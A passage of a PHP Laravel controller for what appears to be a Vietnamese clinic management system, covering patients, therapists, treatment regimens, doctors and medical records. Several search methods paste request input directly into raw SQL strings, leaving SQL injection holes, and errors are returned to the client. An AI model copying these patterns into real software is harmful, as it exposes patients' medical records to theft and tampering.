                'Phone' => $data['dataTherapist']['Phone']
            ];
            $rules = [
                'Code' => 'required',
                'Name' => 'required',
                'Address' => 'required',
                'Phone' => 'required',

            ];
            [
                'Code.required' => 'Mã chuyên viên không được rỗng',
                'Name.required' => 'Tên chuyên viên không được rỗng',
                'Address.required' => 'Địa chỉ chuyên viên không được rỗng',
                'Phone.required' => 'Số điện thoại chuyên viên không được rỗng'
            ];
        } else if ($variable == "validatorPatient") {
            $datas = [
                'Code' => $data['dataPatient']['Code'],
                'Name' => $data['dataPatient']['FullName'],
                'Address' => $data['dataPatient']['Address'],
                'Phone' => $data['dataPatient']['Phone']
            ];
            $rules = [
                'Code' => 'required',
                'Name' => 'required',
                'Address' => 'required',
                'Phone' => 'required',
            ];
            [
                'Code.required' => 'Mã bệnh nhân không được rỗng',
                'Name.required' => 'Tên bệnh nhân không được rỗng',
                'Address.required' => 'Địa chỉ bệnh nhân không được rỗng',
                'Phone.required' => 'Số điện thoại bệnh nhân không được rỗng'
            ];
        } else if ($variable == "validatorPackage") {
            $datas = [
                'Name' => $data['dataPackage']['Name'],
            ];
            $rules = [
                'Name' => 'required',
            ];
            [
                'Name.required' => 'Tên gói không được rỗng',
            ];
        } else if ($variable == "validatorTmPackage") {
            $datas = [
                'Name' => $data['dataTmPackage']['Name'],
            ];
            $rules = [
                'Name' => 'required',
            ];
            [
                'Name.required' => 'Tên gói không được rỗng',
            ];
        } else if ($variable == "validatorProTm") {
            $datas = [
                'Name' => $data['dataProTreatment']['Name'],
            ];
            $rules = [
                'Name' => 'required',
            ];
            [
                'Name.required' => 'Phương pháp điều trị không được rỗng',
            ];
        } else if ($variable == "validatorLocation") {
            $datas = [
                'Name' => $data['dataLocation']['Name'],
            ];
            $rules = [
                'Name' => 'required',
            ];
            [
                'Name.required' => 'Vị trí điều trị không được rỗng',
            ];
        } else if ($variable == "validatorProvince") {
            $datas = [
                'Name' => $data['dataProvince']['Name'],
            ];
            $rules = [
                'Name' => 'required',
            ];
            [
                'Name.required' => 'Tên tỉnh thành không được rỗng',
            ];
        } else if ($variable == "validatorAge") {
            $datas = [
                'Age' => $data['dataAge']['Age'],
            ];
            $rules = [
                'Age' => 'required',
            ];
            [
                'Age.required' => 'Tuổi không được rỗng',
            ];
        } else if ($variable == "validatorRegimen") {
            $datas = [
                'Therapist' => $data['data']['Therapist'],
            ];
            $rules = [
                'Therapist' => 'required',
            ];
            [
                'Therapist.required' => 'Mã chuyên viên không được rỗng',
            ];
        } else if ($variable == "validatorTreatmentPackages") {
            $datas = [
                'TreatmentPackageCode' => $data['data']['TreatmentPackageCode'],
            ];
            $rules = [
                'TreatmentPackageCode' => 'required',
            ];
            [
                'TreatmentPackageCode.required' => 'Mã phiếu không được rỗng',
            ];
        } else if ($variable == "validatorProTm") {
            $datas = [
                'Name' => $data['dataProTreatment']['Name'],
            ];
            $rules = [
                'Name' => 'required',
            ];
            [
                'Name.required' => 'Phương pháp điều trị không được rỗng',
            ];
        } else if ($variable == "validatorLocation") {
            $datas = [
                'Name' => $data['dataLocation']['Name'],
            ];
            $rules = [
                'Name' => 'required',
            ];
            [
                'Name.required' => 'Vị trí điều trị không được rỗng',
            ];
        } else if ($variable == "validatorProvince") {
            $datas = [
                'Name' => $data['dataProvince']['Name'],
            ];
            $rules = [
                'Name' => 'required',
            ];
            [
                'Name.required' => 'Tên tỉnh thành không được rỗng',
            ];
        } else if ($variable == "validatorAge") {
            $datas = [
                'Age' => $data['dataAge']['Age'],
            ];
            $rules = [
                'Age' => 'required',
            ];
            [
                'Age.required' => 'Tuổi không được rỗng',
            ];
        } else if ($variable == "validatorSourceCustomer") {
            $datas = [
                'sourceCustomer' => $data['dataSourceCustomer']['SourceCustomer'],
            ];
            $rules = [
                'sourceCustomer' => 'required',
            ];
            [
                'sourceCustomer.required' => 'Nguồn khách hàng không được rỗng',
            ];
        } else if ($variable == 'validatorDoctor') {
            $datas = [
                'Code' => $data['dataDoctor']['Code'],
                'Name' => $data['dataDoctor']['Name'],
                'Address' => $data['dataDoctor']['Address'],
                'Phone' => $data['dataDoctor']['Phone']
            ];
            $rules = [
                'Code' => 'required',
                'Name' => 'required',
                'Address' => 'required',
                'Phone' => 'required',

            ];
            [
                'Code.required' => 'Mã chuyên viên không được rỗng',
                'Name.required' => 'Tên chuyên viên không được rỗng',
                'Address.required' => 'Địa chỉ chuyên viên không được rỗng',
                'Phone.required' => 'Số điện thoại chuyên viên không được rỗng'
            ];
        }
        return Validator::make($datas, $rules);
    }

    public function checkAilOrNotAil(Request $request)
    {
        try {
            $detail = DetailedTreatment::where('active', 1)
                ->where('professionalTreatmentId', $request->get('professionalId'))->first();
            return $detail;
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function insertStatus(Request $request)
    {

    }

    public function updateAil(Request $request)
    {
       
        $date = date('Y-m-d');
//        try {
            if($request->get('idStatus')==""){

                $status = new Status();
                $status->therapistCode = $request->get('therapistId');
                $status->detailTreatmentId = $request->get('id');
                $status->ail = $request->get('ail');
                $status->dateStart = $request->get('dateStart');
                $status->dateEnd = $request->get('dateEnd');
                $status->createdDate = $date;//$date[0]->now;
                $status->save();
                return 1;
            }else{
                $status = Status::where('id',$request->get('idStatus'))->first();
                if($status){
                    $status->therapistCode = $request->get('therapistId');
                    $status->ail = $request->get('ail');
                    $status->save();
                    return 2;
                }else{
                    return 0;
                }

            }
//        } catch (Exception $ex) {
//            return $ex;
//        }
    }

    public function updateNotAil(Request $request)
    {
        try {
            $detail = DetailedTreatment::where('active', 1)->where('id', $request->get('id'))->first();
            if ($detail) {
                $detail->ail = 0;
                $detail->therapistId = Auth::user()->id;
                $detail->save();
                return 1;
            } else {
                return 2;
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getRegimens()
    {
        return view('admin.regimens')->with('professionals', $this->getDiagnostic());
    }

    public function searchRegimens(Request $request)
    {
        try {
            $SQL = "SELECT pm.id, pm.`code` as 'maBN',pm.fullName, tr.`code` as 'maPD',tr.createdDate FROM treatment_regimens tr INNER JOIN  patient_managements pm  ON pm.`code` = tr.patientId WHERE pm.active = 1 AND tr.active = 1";
            if ($request->get('Patient')['CodePatient'] != "") {
                $SQL .= " AND pm.`code` LIKE '" . '%' . $request->get('Patient')['CodePatient'] . '%' . "'";
            }
            if ($request->get('Patient')['FullName'] != "") {
                $SQL .= " AND pm.fullName LIKE '" . '%' . $request->get('Patient')['FullName'] . '%' . "'";
            }
//            if ($request->get('Patient')['CodeRegimen'] != "") {
//                $SQL .= " AND tr.`code` LIKE '" . '%' . $request->get('Patient')['CodeRegimen'] . '%' . "'";
//            }
            if ($request->get('Patient')['CreatedDate'] != "") {
                $SQL .= " AND tr.createdDate LIKE '" . '%' . $request->get('Patient')['CreatedDate'] . '%' . "'";
            }
            $SQL .= " ORDER BY tr.updated_at desc ";
            $patient = DB::select($SQL);
            return $patient;
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getViewProfessional()
    {
        $therapist = ManagementTherapist::where('active', 1)->get();
        return view('admin.professional')->with('professionals', $this->getDiagnostic())
            ->with('therapists', $therapist);
    }

    public function checkCompleteDetailsTreatment($max, $count, Request $request)
    {
        //$date = date('Y-m-d');
        try {
            $i = 0;
            $j = 0;
            $checkDate=null;
            $status = DB::table('statuses')
                ->join('detailed_treatments','statuses.detailTreatmentId','=','detailed_treatments.id')
                ->where('statuses.active',1)
                ->where('detailed_treatments.treatmentPackageId',$request->get('idPackageTreatment'))
                ->orderBy('statuses.created_at','desc')
                ->take($count)
                ->select(
                    'statuses.*'
                )
                ->get();
            foreach ($status as $item){
                if($i==0){
                    $checkDate = $item->createdDate;
                    $i++;
                }else{
                    if($checkDate == $item->createdDate){
                        $i++;
                    }else{
                        $j++;
                    }
                }
            }
//            var_dump($i);
//            var_dump($j);
//            dd($count);
            //$j se lon hon $i
            // trong truong hop chuyen vien khong lam het phat do trong cung 1 ngay
            // $i = $count
            // trong truong hop chuyen vien da lam het trong cung mot ngay
            if($i == $count){
                return true;
            }else{
                if(($i + $j) == $count){
                    foreach ($status as $item){
                        $detail = Status::where('active', 1)->where('id', $item->id)->first();
                        $detail->active = 0;
                        $detail->save();
                    }
                    return false;
                }else{
                    return false;
                }
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }
    public function fillToTbody(Request $request)
    {
        $date = date('Y-m-d');
        $max = DB::table('detailed_treatments')->where('active',1)->where('treatmentPackageId', $request->get('idPackageTreatment'))->max('createdDate');
        $count = DB::table('detailed_treatments')->where('active',1)->where('treatmentPackageId', $request->get('idPackageTreatment'))->where('sesame','<>',0)->where('createdDate', $max)->count();
        $check = $this->checkCompleteDetailsTreatment($max, $count, $request);
        $detailedTreatment = DB::table('detailed_treatments as detail')
            ->join('location_treatments as location', 'detail.sesame', '=', 'location.id')
            ->join('treatment_packages as treatment', 'treatment.id', '=', 'detail.treatmentPackageId')
            ->where('treatment.id', '=', $request->get('idPackageTreatment'))
            ->where('detail.active', 1)
            ->orderBy('detail.serial', 'asc')
            ->take($count)
            ->select(
                'detail.serial',
                'detail.id as detailId',
                'detail.name as detailName',
//                'detail.therapistId as detailTherapist',
//                'detail.ail as detailAil',
                'detail.minute',
                'detail.time',
                'location.id as sesameId',
                'location.name as sesameName',
                'detail.location as locationName',
                'detail.professionalTreatment as professionalName'
            )
            ->get();

        if ($check) {
            $arraystatus = [];
            foreach ($detailedTreatment as $item) {

                $status = Status::where('active', 1)->where('ail','<>',-1)->where('detailTreatmentId', $item->detailId)->where('createdDate', $date)->first();//->where('createdDate',$date)

                if ($status == true) {
                    $array = [
                        'id' => $status->id,
                        'therapistCode' => $status->therapistCode,
                        'detailId' => $status->detailTreatmentId,
                        'ail' => $status->ail,
                        'dateStart'=>$status->dateStart,
                        'dateEnd'=>$status->dateEnd,
                    ];
                    array_push($arraystatus, $array);
                } else {
                    $array = [
                        'id' => "",
                        'detailId' => $item->detailId,
                        'therapistCode' => "",
                        'ail' => ""
                    ];
                    array_push($arraystatus, $array);
                }
            }
            $Therapist = ManagementTherapist::where('active', 1)->get();
            return view('admin.tbody')->with('detailedTreatments', $detailedTreatment)->with('therapists', $Therapist)->with('arraystatus', $arraystatus);
        } else {
            $arraystatus = [];
            foreach ($detailedTreatment as $item) {
                $status = Status::where('active', 1)->where('ail','<>',-1)->where('detailTreatmentId', $item->detailId)->first();//->where('createdDate',$date)

                if ($status) {
                    $array = [
                        'id' => $status->id,
                        'therapistCode' => $status->therapistCode,
                        'detailId' => $status->detailTreatmentId,
                        'ail' => $status->ail,
                        'dateStart'=>$status->dateStart,
                        'dateEnd'=>$status->dateEnd,
                    ];
                    array_push($arraystatus, $array);
                } else {
                    $array = [
                        'id' => "",
                        'detailId' => $item->detailId,
                        'therapistCode' => "",
                        'ail' => ""
                    ];
                    array_push($arraystatus, $array);
                }
            }
            $Therapist = ManagementTherapist::where('active', 1)->get();
            return view('admin.tbody')->with('detailedTreatments', $detailedTreatment)->with('therapists', $Therapist)->with('arraystatus', $arraystatus);
        }

    }
    public function SearchTreatmentRegimens(Request $request)
    {
        try {
            $arraylistTreatment = [];
            $TreatmentPackage = TreatmentRegimen::where('active', 1)->where('code', $request->get('IdTreatmentRegimen'))->get();
            foreach ($TreatmentPackage as $item) {
                $array = [
                    'id' => $item->id,
                    'active' => $item->active,
                    'code' => $item->code,
                    'status' => $item->status,
                    'note' => $item->note,
                    'treatmentPackageId' => $item->treatmentPackageId,
                    'createdDate' => $item->createdDate,
                    'updatedDate' => $item->updatedDate,
                    'therapist' => $item->therapist
                ];
                array_push($arraylistTreatment, $array);
            }
            return $arraylistTreatment;
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function tbodyRegimen(Request $request)
    {
        try {
            $detailedTreatment = DB::table('detailed_treatments as detail')
                ->join('location_treatments as location', 'detail.sesame', '=', 'location.id')
                ->join('treatment_packages as treatment', 'treatment.id', '=', 'detail.treatmentPackageId')
                ->where('treatment.id', '=', $request->get('idPackageTreatment'))
                ->select(
                    'detail.id as detailId',
                    'detail.name as detailName',
                    'detail.therapistId as detailTherapist',
                    'detail.ail as detailAil',
                    'location.id as sesameId',
                    'location.name as sesameName',
                    'detail.location as locationName',
                    'detail.professionalTreatment as professionalName'
                )
                ->get();
            $Therapist = ManagementTherapist::where('active', 1)->get();
            return view('admin.tbodyregimen')->with('detailedTreatments', $detailedTreatment)->with('therapists', $Therapist);
        } catch (Exception $ex) {

        }
    }

    public function updateRegimen(Request $request)
    {
        try {
            if ($this->validator($request->all(), "validatorRegimen")->fails()) {
                return $this->validator($request->all(), "validatorRegimen")->errors();
            } else {
                if ($request->get('data')['AddNewId'] != null) {
                    $regimen = TreatmentRegimen::where('active', 1)->where('code', $request->get('data')['AddNewId'])->first();
                    if ($regimen) {
                        $regimen->status = $request->get('data')['Status'];
                        $regimen->note = $request->get('data')['Note'];
                        $regimen->therapist = $request->get('data')['Therapist'];
                        $regimen->save();
                        return 1;
                    } else {
                        return 0;
                    }
                } else {
                    return 0;
                }
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getStatisticsPatients()
    {
        try {
            $date = date('Y-m-d');
            $SQL = " SELECT id,MaBN,TEN,NAMSINH,TINH ,GOI,BS,SOLANTAIKHAM, COUNT(SANGCHIEU) AS RAVAO ";
            $SQL .= " FROM ( ";
            $SQL .= " SELECT dt.id, dt.patientId AS MaBN, pm.fullName AS TEN, pm.birthday AS NAMSINH, pv.`name` AS TINH, p.`name` AS GOI, tp.codeDoctor AS BS,tp.umpteenth AS SOLANTAIKHAM,dt.time AS SANGCHIEU ";
            $SQL .= " FROM treatment_packages tp ";
            $SQL .= " INNER JOIN detailed_treatments dt ON tp.id = dt.treatmentPackageId ";
            $SQL .= " LEFT JOIN statuses st ON dt.id = st.detailTreatmentId ";
            $SQL .= " INNER JOIN packages p ON tp.packageId = p.id ";
            $SQL .= " INNER JOIN patient_managements pm ON tp.patientId = pm.`code` ";
            $SQL .= " INNER JOIN source_customers sc ON pm.sourceCustomerId = sc.id ";
            $SQL .= " INNER JOIN provinces pv ON pm.provincialId = pv.id ";
            $SQL .= " WHERE st.createdDate BETWEEN '" . $date . "' AND '" . $date . "' ";
            $SQL .= " AND sc.id = 1 AND tp.umpteenth = 0 ";
            $SQL .= " GROUP BY dt.patientId,dt.time) as a";
            $SQL .= " GROUP BY MaBN ";
            $Patient = DB::select($SQL);
            $sourceCustomer = SourceCustomer::where('active', 1)->get();
            return view('admin.statisticsPatients')->with('sourceCustomers', $sourceCustomer)->with('patients', $Patient);
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function searchStatusPatient(Request $request)
    {
        try {
            $SQL = " SELECT id,MaBN,TEN,NAMSINH,TINH ,GOI,BS,SOLANTAIKHAM, COUNT(SANGCHIEU) AS RAVAO ";
            $SQL .= " FROM ( ";
            $SQL .= " SELECT dt.id, dt.patientId AS MaBN, pm.fullName AS TEN, pm.birthday AS NAMSINH, pv.`name` AS TINH, p.`name` AS GOI, tp.codeDoctor AS BS,tp.umpteenth AS SOLANTAIKHAM,dt.time AS SANGCHIEU ";
            $SQL .= " FROM treatment_packages tp ";
            $SQL .= " INNER JOIN detailed_treatments dt ON tp.id = dt.treatmentPackageId ";
            $SQL .= " LEFT JOIN statuses st ON dt.id = st.detailTreatmentId ";
            $SQL .= " INNER JOIN packages p ON tp.packageId = p.id ";
            $SQL .= " INNER JOIN patient_managements pm ON tp.patientId = pm.`code` ";
            $SQL .= " INNER JOIN source_customers sc ON pm.sourceCustomerId = sc.id ";
            $SQL .= " INNER JOIN provinces pv ON pm.provincialId = pv.id ";
            $SQL .= " WHERE st.createdDate BETWEEN '" . $request->get('data')["FromDate"] . "' AND '" . $request->get('data')["ToDate"] . "' ";
            if ($request->get('data')["SourceCustomerId"] == 0) {

            } else {
                $SQL .= " AND sc.id = " . $request->get('data')["SourceCustomerId"] . " ";
            }
            if ($request->get('data')["Umpteenth"] == 0) {
                $SQL .= " AND tp.umpteenth = 0 ";
            } else if($request->get('data')["Umpteenth"] == 1){
                $SQL .= " AND tp.umpteenth = 1 ";
            }else{

            }
            $SQL .= "  GROUP BY dt.patientId,dt.time) as a";
            $SQL .= " GROUP BY MaBN ";
            $Patient = DB::select($SQL);
            return $Patient;
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getStatisticsTherapist()
    {
        $date = date('Y-m-d');
        try {
            $searchProfessionalTherapist = DB::table('detailed_treatments')
                ->join('patient_managements', 'detailed_treatments.patientId', '=', 'patient_managements.code')
                ->leftJoin('statuses', 'detailed_treatments.id', '=', 'statuses.detailTreatmentId')
                ->join('management_therapists', 'statuses.therapistCode', '=', 'management_therapists.code')
                ->selectRaw(
                    'detailed_treatments.id,
                    detailed_treatments.professionalTreatment as name,
                    patient_managements.code,
                    patient_managements.fullName,
                     statuses.createdDate,
                    statuses.ail,
                    statuses.therapistCode as codeTherapist,
                    management_therapists.name as nameTherapist,
                    COUNT(detailed_treatments.professionalTreatment) as total'
                )
//                ->where('detailed_treatments.therapistId', '<>', 0)
//                ->where('detailed_treatments.ail', '<>', -1)
                ->where('statuses.createdDate', '=', $date)
                //->groupBy('statuses.detailTreatmentId')
                ->groupBy('detailed_treatments.professionalTreatment','management_therapists.name')
                ->get();
            return view('admin.statisticsTherapist')->with('searchProfessionalTherapists', $searchProfessionalTherapist);
        } catch (Exception $ex) {
            return $ex;
        }
    }
    public function searchPatientByCodeTherapist(Request $request)
    {
        $searchPatient = DB::table('detailed_treatments')
            ->join('patient_managements', 'detailed_treatments.patientId', '=', 'patient_managements.code')
            ->join('statuses', 'detailed_treatments.id', '=', 'statuses.detailTreatmentId')
            ->join('management_therapists', 'statuses.therapistCode', '=', 'management_therapists.code')
            ->selectRaw(
                   'detailed_treatments.professionalTreatment as name,
                    patient_managements.code,
                    patient_managements.fullName,
                    statuses.createdDate,
                    statuses.ail,
                    statuses.therapistCode as codeTherapist'
            )
            ->whereBetween('statuses.createdDate', [$request->get('data')['FromDate'], $request->get('data')['ToDate']])
            ->where('statuses.therapistCode',$request->get('codeTherapist'))
            ->where('detailed_treatments.professionalTreatment',$request->get('Professional'))
            ->get();
        return $searchPatient;
    }
    public function searchProfessionalTherapist(Request $request)
    {
        
//        try {
            $searchProfessionalTherapist = DB::table('detailed_treatments')
                ->join('patient_managements', 'detailed_treatments.patientId', '=', 'patient_managements.code')
                ->join('statuses', 'detailed_treatments.id', '=', 'statuses.detailTreatmentId')
                ->join('management_therapists', 'statuses.therapistCode', '=', 'management_therapists.code')
                ->selectRaw(
                    'detailed_treatments.id,
                    detailed_treatments.professionalTreatment as name,                    
                    patient_managements.code,
                    patient_managements.fullName,
                    statuses.createdDate,
                    statuses.ail,
                    statuses.therapistCode as codeTherapist,
                    management_therapists.name as nameTherapist,
                    COUNT(detailed_treatments.professionalTreatment) as total'
                )
                ->whereBetween('statuses.createdDate', [$request->get('data')['FromDate'], $request->get('data')['ToDate']])
                ->groupBy('detailed_treatments.professionalTreatment','management_therapists.name')
                ->get();


            return $searchProfessionalTherapist;
//        } catch (Exception $ex) {
//            return $ex;
//        }
    }

    public function deleteProfessional(Request $request)
    {
        $dateServer = date('Y-m-d');
        try {
            if ($request->get('id') != null) {
                $detail = DetailedTreatment::where('active', 1)->where('id', $request->get('id'))->first();
                if ($detail->therapistId == "0" && $detail->ail == "-1" && $detail->createdDate == $dateServer[0]->now) {
                    $detail->delete();
                    return 1;
                } else {
                    $detail->active = 0;
                    $detail->save();
                    return 1;
                }
            } else {
                return 0;
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getViewMedicalRecord()
    {
        $patient = PatientManagement::where('active', 1)->get();
        $medical = MedicalRecord::where('active', 1)->orderBy('updated_at', 'desc')->get();
        return view('admin.medicalrecord')->with('patients', $patient)->with('medicals', $medical);
    }

    public function addNewAndUpdateMedicalRecord(Request $request)
    {
        try {
            if ($request->get('data')['Id'] == null) {
                try {
                    $medical = new MedicalRecord();
                    $medical->patientId = $request->get('data')['PatientId'];
                    $medical->reasons = trim($request->get('data')['Reasons']);
                    $medical->pathologicalProcess = trim($request->get('data')['PathologicalProcess']);
                    $medical->anamnesis = trim($request->get('data')['Anamnesis']);
                    $medical->body = trim($request->get('data')['Body']);
                    $medical->parts = trim($request->get('data')['Parts']);
//                    $medical->temperature = trim($request->get('data')['Temperature']);
//                    $medical->bloodPressure = trim($request->get('data')['BloodPressure']);
//                    $medical->breathing = trim($request->get('data')['Breathing']);
//                    $medical->weight = trim($request->get('data')['Weight']);
//                    $medical->height = trim($request->get('data')['Height']);
                    $medical->subclinical = trim($request->get('data')['Subclinical']);
                    $medical->save();
                    return 1;
                } catch (Exception $ex) {
                    return $ex;
                }
            } else {
                try {
                    $medical = MedicalRecord::where('active', 1)->where('id', $request->get('data')['Id'])->first();
                    if ($medical) {
                        $medical->patientId = $request->get('data')['PatientId'];
                        $medical->reasons = trim($request->get('data')['Reasons']);
                        $medical->pathologicalProcess = trim($request->get('data')['PathologicalProcess']);
                        $medical->anamnesis = trim($request->get('data')['Anamnesis']);
                        $medical->body = trim($request->get('data')['Body']);
                        $medical->parts = trim($request->get('data')['Parts']);
//                        $medical->temperature = trim($request->get('data')['Temperature']);
//                        $medical->bloodPressure = trim($request->get('data')['BloodPressure']);
//                        $medical->breathing = trim($request->get('data')['Breathing']);
//                        $medical->weight = trim($request->get('data')['Weight']);
//                        $medical->height = trim($request->get('data')['Height']);
                        $medical->subclinical = trim($request->get('data')['Subclinical']);
                        $medical->save();
                        return 2;
                    } else {
                        return 0;
                    }
                } catch (Exception $ex) {
                    return $ex;
                }
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getMedicalRecord()
    {
        try {
            $searchProfessionalTherapist = DB::table('medical_records')
                ->join('patient_managements', 'medical_records.patientId', '=', 'patient_managements.code')
                ->where('medical_records.active', 1)
                ->select(
                    'medical_records.id',
                    'patient_managements.code',
                    'patient_managements.fullName as name',
                    'medical_records.reasons'
                )
                ->orderBy('medical_records.updated_at', 'desc')
                ->get();
            return $searchProfessionalTherapist;
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getMedicalRecordOnly(Request $request)
    {
        try {
            $medicalrecord = MedicalRecord::where('active', 1)->where('id', $request->get('id'))->first();
            return $medicalrecord;
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function searchPatientByCodePatient(Request $request)
    {
        try{
            $patient = PatientManagement::where('active',1)->where('code',$request->get('search'))->get();
            return array('listPatient'=>$patient);
        }catch (Exception $ex){
            return $ex;
        }
    }
    public function searchMedicalRecordViewByCodePatient(Request $request)
    {
        try {
            $search = DB::table('medical_records')
                ->join('patient_managements', 'medical_records.patientId', '=', 'patient_managements.code')
                ->where('medical_records.active', 1)
                ->where('patient_managements.code', 'LIKE', '%' . $request->get('search') . '%')
                ->select(
                    'medical_records.id',
                    'patient_managements.code',
                    'patient_managements.fullName as name',
                    'medical_records.reasons'
                )
                ->orderBy('medical_records.updated_at', 'desc')
                ->get();
            return $search;
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getViewDoctor()
    {
        try {
            $age = Age::where('active', 1)->get();
            $province = Provinces::where('active', 1)->get();
            $doctor = Doctor::where('active', 1)->orderBy('updated_at', 'desc')->get();
            return view('admin.doctor')->with('ages', $age)->with('provinces', $province)->with('doctors', $doctor);
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getDoctor()
    {
        $arrayListDoctor = [];
        $listDoctor = Doctor::where('active', 1)->orderBy('updated_at', 'desc')->get();
        foreach ($listDoctor as $Doctor) {
            $array = [
                'id' => $Doctor->id,
                'code' => $Doctor->code,
                'name' => $Doctor->name,
                'sex' => $Doctor->sex,
                'phone' => $Doctor->phone,
                'provincial' => $Doctor->Provinces()->name,
                'age' => $Doctor->Age()->age
            ];
            array_push($arrayListDoctor, $array);
        }
        return $arrayListDoctor;
    }

    public function addNewAndUpdateDoctor(Request $request)
    {
        try {
            $result = null;
            if ($this->validator($request->all(), "validatorDoctor")->fails()) {
                return $this->validator($request->all(), "validatorDoctor")->errors();
            } else {
                if ($request->get('addNewOrUpdateId') == null) {
                    try {
                        $therapist = new Doctor();
                        $therapist->code = $request->get('dataDoctor')['Code'];
                        $therapist->name = $request->get('dataDoctor')['Name'];
                        $therapist->address = $request->get('dataDoctor')['Address'];
                        $therapist->phone = $request->get('dataDoctor')['Phone'];
                        $therapist->sex = $request->get('dataDoctor')['Sex'];
                        $therapist->ageId = $request->get('dataDoctor')['AgeId'];
                        $therapist->provincialId = $request->get('dataDoctor')['ProvincialId'];
                        $therapist->createdBy = Auth::user()->id;
                        $therapist->updatedBy = Auth::user()->id;
                        $therapist->save();
                        $result = array(1, 'listDoctor' => $this->getDoctor());
                    } catch (Exception $ex) {
                        return $ex;
                    }
                } else {
                    try {
                        $therapist = Doctor::where('active', 1)->where('id', $request->get('addNewOrUpdateId'))->first();
                        if ($therapist) {
                            $therapist->code = $request->get('dataDoctor')['Code'];
                            $therapist->name = $request->get('dataDoctor')['Name'];
                            $therapist->address = $request->get('dataDoctor')['Address'];
                            $therapist->phone = $request->get('dataDoctor')['Phone'];
                            $therapist->sex = $request->get('dataDoctor')['Sex'];
                            $therapist->ageId = $request->get('dataDoctor')['AgeId'];
                            $therapist->provincialId = $request->get('dataDoctor')['ProvincialId'];
                            $therapist->updatedBy = Auth::user()->id;
                            $therapist->save();
                            $result = array(2, 'listDoctor' => $this->getDoctor());
                        } else {
                            $result = array(0, 'listDoctor' => null);
                        }
                    } catch (Exception $ex) {
                        return $ex;
                    }
                }
                return $result;
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function postViewDoctor(Request $request)
    {
        try {
            $doctor = Doctor::where('active', 1)->where('id', $request->get('idDoctor'))->first();
            if ($doctor) {
                return $doctor;
            } else {
                return null;
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getSearchCodeDoctor(Request $request)
    {
        try {
            $doctor = DB::table('doctors')
                ->where('code', 'LIKE', '%' . $request->get('Code') . '%')
                ->select(
                    'doctors.code'
                )
                ->get();


//            $doctor=Doctor::where('active',1)->where('code','LIKE','%' . $request->get('Code')  . '%')->get();
            if (count($doctor) == 1) {
                return $doctor;
            } else if (count($doctor) == 0) {
                return 0;
            } else if (count($doctor) > 1) {
                return 2;
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getSearchCodeTherapist(Request $request)
    {
        try {
            $therapist = DB::table('management_therapists')
                ->where('code', 'LIKE', '%' . $request->get('Code') . '%')
                ->select(
                    'management_therapists.code'
                )
                ->get();

//            $doctor=Doctor::where('active',1)->where('code','LIKE','%' . $request->get('Code')  . '%')->get();
            if (count($therapist) == 1) {
                return $therapist;
            } else if (count($therapist) == 0) {
                return 0;
            } else if (count($therapist) > 1) {
                return 2;
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getSearchCodeProfessional(Request $request)
    {
        try {
            $pro = DB::table('professional_treatments')
                ->where('name', 'LIKE', '%' . $request->get('Name') . '%')
                ->select(
                    'professional_treatments.name'
                )
                ->get();
//            $doctor=Doctor::where('active',1)->where('code','LIKE','%' . $request->get('Code')  . '%')->get();
            if (count($pro) == 1) {
                return $pro;
            } else if (count($pro) == 0) {
                return 0;
            } else if (count($pro) > 1) {
                return 2;
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getViewSourceCustomer()
    {
        try {
            $sourcecustomer = SourceCustomer::where('active', 1)->get();
            return view('admin.sourcecustomer')->with('sourcecustomers', $sourcecustomer);
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function getSourceCustomer()
    {
        $arrayListSourceCustomer = [];
        $listSourceCustomer = SourceCustomer::where('active', 1)->get();
        foreach ($listSourceCustomer as $item) {
            $array = [
                'id' => $item->id,
                'sourceCustomer' => $item->sourceCustomer,
            ];
            array_push($arrayListSourceCustomer, $array);
        }
        return $arrayListSourceCustomer;
    }

    public function addNewAndUpdateSourceCustomer(Request $request)
    {
        try {
            $result = null;
            if ($this->validator($request->all(), "validatorSourceCustomer")->fails()) {
                return $this->validator($request->all(), "validatorSourceCustomer")->errors();
            } else {
                if ($request->get('addNewOrUpdateId') == "") {
                    try {
                        $sourceCustomer = new SourceCustomer();
                        $sourceCustomer->sourceCustomer = $request->get('dataSourceCustomer')['SourceCustomer'];
                        $sourceCustomer->createdBy = Auth::user()->id;
                        $sourceCustomer->upDatedBy = Auth::user()->id;
                        $sourceCustomer->save();
                        $result = array(1, 'listSourceCustomer' => $this->getSourceCustomer());
                    } catch (Exception $ex) {
                        return $ex;
                    }
                } else {
                    $sourceCustomer = SourceCustomer::where('active', 1)->where('id', $request->get('addNewOrUpdateId'))->first();
                    if ($sourceCustomer) {
                        try {
                            $sourceCustomer->sourceCustomer = $request->get('dataSourceCustomer')['SourceCustomer'];
                            $sourceCustomer->upDatedBy = Auth::user()->id;
                            $sourceCustomer->save();
                            $result = array(2, 'listSourceCustomer' => $this->getSourceCustomer());
                        } catch (Exception $ex) {
                            return $ex;
                        }
                    } else {
                        $result = array(0, 'listSourceCustomer' => null);
                    }
                }
            }
            return $result;
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function postViewSourceCustomer(Request $request)
    {
        try {
            $SourceCustomer = SourceCustomer::where('active', 1)->where('id', $request->get('idSourceCustomer'))->first();
            if ($SourceCustomer) {
                return $SourceCustomer;
            } else {
                return null;
            }
        } catch (Exception $ex) {
            return $ex;
        }
    }

    public function report(Request $request)
    {
        try {
            $arrayDate = [];
            $patient = PatientManagement::where('active', 1)->where('code', $request->get('dataPatient'))->first();
            $record = MedicalRecord::where('active', 1)->where('patientId', $request->get('dataPatient'))->first();
            $regimen = $this->searchProfessional($request);
